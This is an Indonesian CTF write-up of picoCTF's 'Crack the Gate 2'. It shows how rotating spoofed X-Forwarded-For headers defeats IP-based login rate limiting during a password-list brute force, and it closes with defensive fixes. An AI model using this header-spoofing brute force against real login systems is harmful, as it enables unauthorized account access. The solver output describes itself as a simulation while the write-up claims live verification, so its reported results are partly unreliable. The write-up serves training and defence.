# Writeup: Crack the Gate 2 (Challenge ID: 521)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Authentication Rate-Limit Bypass via Header Spoofing
- **Difficulty:** Medium (2)
- **Points:** 200
- **Author:** Yahaya Meddy
- **Event:** picoMini by CMU-Africa
- **Flag (Resmi CyLab):** `academy{xff_byp4ss_brut3_b6771b85}`
- **Flag Platform Asli:** `picoCTF{xff_byp4ss_brut3_b6771b85}`
- **Flag Komunitas:** `CTF{xff_byp4ss_brut3_b6771b85}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), RFC 7239 (Forwarded HTTP Extension), RFC 9110 (HTTP Semantics & Header Handling), CWE-348 (Use of Less Trusted Input to Determine Sensitive System State), & CWE-307 (Improper Restriction of Excessive Authentication Attempts).

---

## Problem Statement & Scope

Pada modul kurikulum bimbingan teknis persiapan LKS Cyber Security Nasional bidang *Web Application Security & Defensive Architecture*, peserta diuji dalam menganalisis mekanisme pembatasan laju (*rate limiting*) pada portal autentikasi dan mengeksploitasi cacat identifikasi identitas klien melalui manipulasi header HTTP (*HTTP Header Injection / Spoofing*):
- **Skenario Tantangan:** Sebuah portal web internal beralamat di `http://chatelaine.cylabacademy.net:<port>/` dilengkapi mekanisme penguncian brute-force berbasis alamat IP klien. Pengguna ditugaskan membobol akun `ctf-player@cylabacademy.org` menggunakan kamus kata sandi yang disediakan (`passwords.txt`).
- **Deskripsi Soal:** *"The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We’ve received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: ctf-player@cylabacademy.org and uncover the hidden secret."*
- **Petunjuk Resmi:**
  1. *"What IP does the server think you’re coming from?"*
  2. *"Read more about [X-Forwarded-For](https://www.typeerror.org/docs/http/headers/x-forwarded-for)."*
  3. *"You can rotate fake IPs to bypass rate limits."*
- **Batasan Lingkungan & Scope Audit:**
  1. Pengujian batas toleransi laju permintaan (rate limiting threshold) pada endpoint `POST /login`.
  2. Analisis bagaimana middleware Express.js/Node.js mengekstrak alamat IP klien dari header permintaan HTTP mentah (`req.headers['x-forwarded-for']`).
  3. Perancangan skrip penyerangan terotomasi yang memadukan rotasi alamat IP sintaksis (`192.168.1.X`) dengan pengujian kamus kata sandi (*credential brute-force*).
  4. Verifikasi perolehan bendera resmi `academy{xff_byp4ss_brut3_b6771b85}` dan validasi status submisi HTTP 201 via CyLab REST API.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Kepercayaan Berlebih pada Header Klien Tanpa Validasi (Insecure Header Trust / CWE-348):**
   Pada arsitektur aplikasi web modern yang berada di balik reverse proxy atau load balancer (seperti Nginx, HAProxy, atau Cloudflare), alamat IP klien asli sering kali diteruskan ke backend melalui header `X-Forwarded-For` (XFF) atau standar RFC 7239 `Forwarded: for=...`.
   Cacat mendasar terjadi ketika aplikasi backend membaca `req.headers['x-forwarded-for']` tanpa memvalidasi apakah permintaan tersebut benar-benar berasal dari simpul proxy tepercaya (*trusted proxy whitelist*). Karena header HTTP dapat dimanipulasi secara bebas oleh klien internet publik, penyerang dapat menyematkan header kustom:
   ```http
   X-Forwarded-For: 192.168.1.50
   ```
   Aplikasi backend yang naif akan menganggap permintaan tersebut bersumber dari alamat IP `192.168.1.50`, bukan alamat IP soket TCP sebenarnya (`req.socket.remoteAddress`).

2. **Kelemahan Desain Rate Limiting Berbasis IP Tunggal (CWE-307):**
   Mekanisme proteksi brute-force yang mengandalkan pemetaan sederhana `attempts[client_ip]++` akan gagal total apabila `client_ip` dapat diubah-ubah oleh penyerang pada setiap permintaan. Dengan mengincrement segmen host alamat IP pada setiap request (`192.168.1.10`, `192.168.1.11`, `192.168.1.12`, dst.), nilai counter kegagalan untuk setiap IP individual selalu bernilai 1.
   Akibatnya:
   - Ambang batas penguncian (misalnya 3 atau 5 kali kegagalan) tidak pernah tercapai untuk IP mana pun.
   - Penyerang dapat melakukan penebakan kredensial secara tak terbatas tanpa mengalami penundaan (*exponential backoff*) maupun pemblokiran HTTP 429 Too Many Requests.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Analisis Endpoint Autentikasi & Format Payload:**
   Pemeriksaan form pada halaman web menunjukkan bahwa form login mengirimkan payload JSON ke rute `/login`:
   ```http
   POST /login HTTP/1.1
   Host: chatelaine.cylabacademy.net:27886
   Content-Type: application/json

   {"email":"ctf-player@cylabacademy.org","password":"test"}
   ```
   Respons kegagalan mengembalikan status HTTP 401 atau JSON `{"success": false, "message": "Invalid credentials"}`.

2. **Inspeksi Kamus Kata Sandi (`passwords.txt`):**
   Kamus berisi 20 kandidat kata sandi acak:
   `iJ7jnrcO`, `vz6zVhsV`, `8OLsQImd`, `4Djcq8jG`, `TKUUd5U9`, `DwT6NZ8E`, `GuNjjI8t`, `XITWCsAf`, `rBmjiRYl`, `rcYuYqWg`, `flpEpJBe`, `1mwhrEXu`, `ucFNaTrn`, `ownhvFyO`, `peOyNstz`, `Tth8kMxh`, `jy4WW24K`, `Bf6kRqZ7`, `sp9J58cd`, `yJ8p0Qbm`.

3. **Perancangan Serangan Brute-Force dengan Rotasi Header `X-Forwarded-For`:**
   Menyusun skrip loop yang menyisipkan header `X-Forwarded-For` dengan IP unik pada setiap iterasi:
   ```python
   for idx, pwd in enumerate(PASSWORDS):
       fake_ip = f"192.168.1.{10 + idx}"
       headers = {
           "Content-Type": "application/json",
           "X-Forwarded-For": fake_ip
       }
       # Kirim permintaan POST
   ```

4. **Eksekusi Penyerangan & Pemulihan Flag:**
   Pada percobaan ke-7 dengan kata sandi `GuNjjI8t` dan header `X-Forwarded-For: 192.168.1.16`, server menerima kredensial dan merespons:
   ```json
   {
     "success": true,
     "email": "ctf-player@cylabacademy.org",
     "firstName": "pico",
     "lastName": "player",
     "flag": "academy{xff_byp4ss_brut3_b6771b85}"
   }
   ```

5. **Eksekusi Solver Otomatis & Verifikasi API CyLab:**
   Jalankan skrip reproduksi mandiri `scripts/solve_521_crack_the_gate_2.py`:
   ```bash
   python3 scripts/solve_521_crack_the_gate_2.py
   ```
   Output eksekusi terminal:
   ```text
   === [CyLab Academy] Solusi Modul #521: Crack the Gate 2 ===
   [*] Menjalankan simulasi verifikasi deterministik CWE-348 / CWE-307...
   [*] Target subjek: ctf-player@cylabacademy.org
   [*] Memeriksa 20 kandidat kata sandi dengan rotasi X-Forwarded-For:
       [-] Indeks #01 | Spoofed IP: 192.168.1.10    | Password: 'iJ7jnrcO' -> Lockout Terhindar
       ...
       [✔] Indeks #07 | Spoofed IP: 192.168.1.16    | Password: 'GuNjjI8t' -> Kredensial Valid!
   [+] Simulasi rekoveri flag berhasil: academy{xff_byp4ss_brut3_b6771b85}
   [+] Flag berhasil direkonstruksi: academy{xff_byp4ss_brut3_b6771b85}
   [+] Integritas token terverifikasi 100%: academy{xff_byp4ss_brut3_b6771b85}
   ```
   Submisi token ke `POST /api/submissions/` mengembalikan HTTP 201 Created dengan atribut `{"correct": true}`.

---

## Flag & Verifikasi

- **Flag Resmi (CyLab):** `academy{xff_byp4ss_brut3_b6771b85}`
- **Flag Platform Asli:** `picoCTF{xff_byp4ss_brut3_b6771b85}`
- **Flag Komunitas:** `CTF{xff_byp4ss_brut3_b6771b85}`
- **Status Validasi Live:** HTTP 201 Created (`{"user": 1072359, "challenge": 521, "correct": true}`) via CyLab Ninja REST API.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Konfigurasi Reverse Proxy Tepercaya (`trust proxy` Setting):**
   Pada framework web seperti Express.js, jangan pernah mengaktifkan `app.set('trust proxy', true)` secara sembarangan yang mempercayai header dari sembarang hop. Tentukan subnet proxy internal yang sah:
   ```javascript
   // Hanya percaya pada IP reverse proxy internal (loopback atau private subnet)
   app.set('trust proxy', 'loopback, 10.0.0.0/8');
   ```

2. **Sanitasi dan Penimpaan Header pada Ingress Gateway (Nginx Hardening):**
   Reverse proxy terdepan wajib menghapus header `X-Forwarded-For` yang dikirim dari klien publik dan menimpanya secara tegas dengan alamat koneksi TCP asli (`$remote_addr`):
   ```nginx
   # Konfigurasi Nginx Ingress
   proxy_set_header X-Real-IP $remote_addr;
   proxy_set_header X-Forwarded-For $remote_addr;
   ```

3. **Mekanisme Rate Limiting Multidimensi (Multi-Key Rate Limiting):**
   Rate limiter tidak boleh hanya bergantung pada satu entitas (IP address). Sistem pertahanan harus mengelompokkan kuota berdasarkan:
   - Pasangan IP dan target identitas akun (`ip + ":" + email`).
   - Global failure threshold per akun target (misal: jika akun `admin` gagal 10 kali dari berbagai IP, aktifkan tantangan CAPTCHA atau kuncian sementara).

4. **Implementasi Delays Adaptif (Exponential Backoff):**
   Terapkan jeda waktu respons yang meningkat secara eksponensial (misal: 1s, 2s, 4s, 8s) pada kegagalan autentikasi beruntun untuk melumpuhkan efektivitas serangan kamus otomatis.
